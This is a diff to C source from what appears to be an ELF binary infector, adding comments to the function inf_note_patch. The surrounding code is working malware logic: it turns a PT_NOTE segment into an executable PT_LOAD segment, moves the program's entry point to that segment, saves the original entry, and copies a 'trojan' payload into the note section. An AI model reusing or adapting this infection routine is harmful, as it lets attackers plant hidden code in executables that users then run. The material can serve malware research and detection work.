@@ -75,6 +75,7 @@ static elf_off_t _inf_set_pad(infect_t *inf, elf_phdr_t *text, elf_phdr_t *data)
     return rv;
 }
 
+/** Find and return the larger SHT_NOTE section, if any */
 static elf_shdr_t *_inf_get_largest_note(infect_t *inf) {
     elf_t *e = inf->elfo;
     elf_xword_t max = 0;
@@ -202,6 +203,10 @@ bool inf_note_patch(infect_t *inf) {
     ASSERT_ARG_RET_FALSE(inf);
     ASSERT_CON_RET_FALSE(inf->elfo);
 
+    /**
+     * Find out isf we have enough space for infection
+     * in one of SHT_NOTE sections, if any
+     */
     elf_shdr_t *sht_note = _inf_get_largest_note(inf);
     if (!sht_note) {
         log_error("Error: No available .note section\n");
@@ -214,6 +219,7 @@ bool inf_note_patch(infect_t *inf) {
         return false;
     }
 
+    /** For now accept only when we have only one PT_NOTE */
     int nr_note = inf->elfo->phmap[LAZY_PT_NOTE].nr;
     if (nr_note != 1) {
         log_error("Wait! Have we been here before?\n");
@@ -223,12 +229,20 @@ bool inf_note_patch(infect_t *inf) {
     int ph_note_idx = inf->elfo->phmap[LAZY_PT_NOTE].map[0];
     elf_phdr_t *phdr = inf->elfo->phdrs[ph_note_idx];
 
+    /** Move sht virtual address way ahead so it won't hit others */
     sht_note->sh_addr = sht_note->sh_offset + 0x400000;
+
     sht_note->sh_type = SHT_PROGBITS;
+
+    /** Executable */
     sht_note->sh_flags = SHF_ALLOC | SHF_EXECINSTR;
     sht_note->sh_addralign = 16;
     sht_note->sh_size = inf->trojan_size;
 
+    /**
+     * Turn PT_NOTE program into PT_LOAD
+     * and set entry points
+     */
     phdr->p_type = PT_LOAD;
     phdr->p_filesz = inf->trojan_size;
     phdr->p_memsz = inf->trojan_size;
@@ -241,6 +255,7 @@ bool inf_note_patch(infect_t *inf) {
     *(inf->magic_ptr) = inf->elfo->ehdr->e_entry;
     inf->elfo->ehdr->e_entry = sht_note->sh_addr;
     unsigned char *dest = (unsigned char*)inf->elfo->mapaddr + sht_note->sh_offset;
+    /** Inject trojan into cozy SHT_NOTE section */
     memcpy(dest, inf->trojan, inf->trojan_size);
 
     return true;
